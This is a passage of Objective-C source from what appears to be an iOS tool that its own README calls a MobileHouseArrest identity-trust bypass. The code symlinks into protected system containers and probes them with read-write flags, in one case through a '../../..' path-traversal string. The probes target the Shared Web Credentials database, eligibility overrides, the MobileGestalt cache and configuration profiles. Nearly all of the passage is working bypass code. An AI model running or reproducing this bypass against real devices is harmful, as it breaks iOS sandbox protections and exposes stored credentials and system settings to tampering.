        if (symlink(target.fileSystemRepresentation, link.fileSystemRepresentation) != 0)
            continue;
        [self recordLink:apps identifier:identifier target:target];
        unionLinks++;
    }
    if (unionLinks)
        FFLogTag(@"MCM", @"bad_query union links added=%lu", (unsigned long)unionLinks);

    NSArray<NSDictionary *> *additionalCategories = @[
        @{@"Directory": vpnData, @"Class": @6, @"Group": @(NO), @"CustomKey": @"VPNData", @"Fallback": @[]},
        @{@"Directory": serviceData, @"Class": @10, @"Group": @(NO), @"CustomKey": @"ServiceData",
          @"Fallback": @[@"com.apple.swcd", @"com.apple.familycircled", @"com.apple.locationd",
                         @"com.apple.lsd", @"com.apple.installd", @"com.apple.accountsd",
                         @"com.apple.itunescloudd", @"com.apple.nanonewscd"]},
        @{@"Directory": systemData, @"Class": @12, @"Group": @(NO), @"CustomKey": @"SystemData",
          @"Fallback": @[@"com.apple.eligibilityd", @"com.apple.geod", @"com.apple.springboard"]},
        @{@"Directory": systemGroups, @"Class": @13, @"Group": @(YES), @"CustomKey": @"SystemGroups",
          @"Fallback": @[@"systemgroup.com.apple.configurationprofiles",
                         @"systemgroup.com.apple.pisco.suinfo",
                         @"systemgroup.com.apple.lsd.iconscache",
                         @"systemgroup.com.apple.icloud.findmydevice.managed",
                         @"systemgroup.com.apple.ondemandresources",
                         @"systemgroup.com.apple.mobilegestaltcache",
                         @"systemgroup.com.apple.nsurlstoragedresources",
                         @"systemgroup.com.apple.installcoordinationd",
                         @"systemgroup.com.apple.osanalytics",
                         @"systemgroup.com.apple.ContainerManagerTest.fixed"]},
        @{@"Directory": protectedData, @"Class": @15, @"Group": @(NO), @"CustomKey": @"ProtectedData",
          @"Fallback": @[@"com.apple.appmanagedfeaturesd"]},
    ];
    for (NSDictionary *category in additionalCategories) {
        uint64_t containerClass = [category[@"Class"] unsignedLongLongValue];
        NSMutableOrderedSet *identifiers =
            [NSMutableOrderedSet orderedSetWithArray:MCMDynamicIdentifiers(containerClass)];
        [identifiers addObjectsFromArray:category[@"Fallback"]];
        NSString *customKey = category[@"CustomKey"];
        for (id value in [custom[customKey] isKindOfClass:NSArray.class] ? custom[customKey] : @[])
            if ([value isKindOfClass:NSString.class] && MCMSafeIdentifier(value))
                [identifiers addObject:value];
        for (NSString *identifier in identifiers)
            [self installLink:category[@"Directory"] identifier:identifier
                containerClass:containerClass group:[category[@"Group"] boolValue]];
    }

    [self installDirectFilesystemLinks:vpnData containerRoot:@"/private/var/mobile/Containers/Data/VPNPlugin"];
    [self installDirectFilesystemLinks:serviceData containerRoot:@"/private/var/mobile/Containers/Data/InternalDaemon"];
    [self installDirectFilesystemLinks:systemData containerRoot:@"/private/var/mobile/Containers/Data/System"];
    [self installDirectFilesystemLinks:systemGroups containerRoot:@"/private/var/mobile/Containers/Shared/SystemGroup"];
    [self installDirectFilesystemLinks:protectedData containerRoot:@"/private/var/mobile/Containers/Data/Protected"];

    [self installScopedLink:additionalLocations linkName:@"[MHA-C13] Install Coordination"
        containerClass:13 identifier:@"systemgroup.com.apple.installcoordinationd"
        group:YES part:3 partDomain:@"../InstallCoordination"];
    [self installScopedLink:additionalLocations linkName:@"[MHA-C13] Configuration Profiles"
        containerClass:13 identifier:@"systemgroup.com.apple.configurationprofiles"
        group:YES part:0 partDomain:nil];
    [self installScopedLink:additionalLocations linkName:@"[MHA-C13] MobileGestalt Cache"
        containerClass:13 identifier:@"systemgroup.com.apple.mobilegestaltcache"
        group:YES part:3 partDomain:nil];

    NSArray<NSDictionary *> *probes = @[
        @{@"Name": @"01 [MHA-C13] Install Coordination", @"Class": @13,
          @"Identifier": @"systemgroup.com.apple.installcoordinationd", @"Group": @YES,
          @"Part": @3, @"PartDomain": @"../InstallCoordination",
          @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"Coordinators", @"DataPromises", @"PromiseStaging"]},
        @{@"Name": @"02 [MHA-C13] MobileGestalt Cache", @"Class": @13,
          @"Identifier": @"systemgroup.com.apple.mobilegestaltcache", @"Group": @YES,
          @"Part": @3, @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"com.apple.MobileGestalt.plist"]},
        @{@"Name": @"03 [MHA-C12] Eligibility Overrides", @"Class": @12,
          @"Identifier": @"com.apple.eligibilityd", @"Group": @NO,
          @"Part": @3, @"PartDomain": @"NeverRestore", @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"eligibility_overrides.data"]},
        @{@"Name": @"04 [MHA-C15] App Managed Data", @"Class": @15,
          @"Identifier": @"com.apple.appmanagedfeaturesd", @"Group": @NO,
          @"Part": @0, @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"com.apple.appmanagedfeaturesd/ConfigurationPersistence"]},
        @{@"Name": @"05 [MHA-C13] Configuration Profiles Root", @"Class": @13,
          @"Identifier": @"systemgroup.com.apple.configurationprofiles", @"Group": @YES,
          @"Part": @0, @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"Library/ConfigurationProfiles/PayloadManifest.plist"]},
        @{@"Name": @"06 [MHA-C10] Shared Web Credentials Root", @"Class": @10,
          @"Identifier": @"com.apple.swcd", @"Group": @NO,
          @"Part": @0, @"Flags": @(kMCMFlags),
          @"Expected": @[@"com.apple.SharedWebCredentials/swc.db"]},
        @{@"Name": @"07 [MHA-C12] System Data Library Control", @"Class": @12,
          @"Identifier": @"com.apple.geod", @"Group": @NO,
          @"Part": @3, @"PartDomain": @"..", @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"Caches", @"Preferences"]},
        @{@"Name": @"08 [MHA-C12] MobileGestalt via System Data", @"Class": @12,
          @"Identifier": @"com.apple.geod", @"Group": @NO,
          @"Part": @3,
          @"PartDomain": @"../../../../../../containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches",
          @"Flags": @(kMCMReadWritePartFlags),
          @"Expected": @[@"com.apple.MobileGestalt.plist"]},
    ];
    NSMutableArray *results = [NSMutableArray array];
    for (NSDictionary *probe in probes)
        [results addObject:MCMRunExperimentalProbe(self, experimental, probe)];
    [results writeToFile:[experimental stringByAppendingPathComponent:@"Probe Results.plist"]
              atomically:YES];

    NSString *readme = @"Experimental consumer traversal\n\n"
        @"MHA-MCM: MobileHouseArrest identity-trust bypass. C10/C12/C13/C15 identify the ContainerManager class.\n"
        @"Links appear only after a token, activation, and a read-only directory open all succeed.\n"
        @"The links point at live system directories. Viewing is safest; edit at your own risk.\n";
    [readme writeToFile:[experimental stringByAppendingPathComponent:@"README.txt"]
              atomically:YES encoding:NSUTF8StringEncoding error:nil];

    [self writeAccessMap:root];
    _started = YES;
    FFLogTag(@"MCM", @"ready root=%@ active_leases=%lu", root, (unsigned long)_leases.count);
}

@end
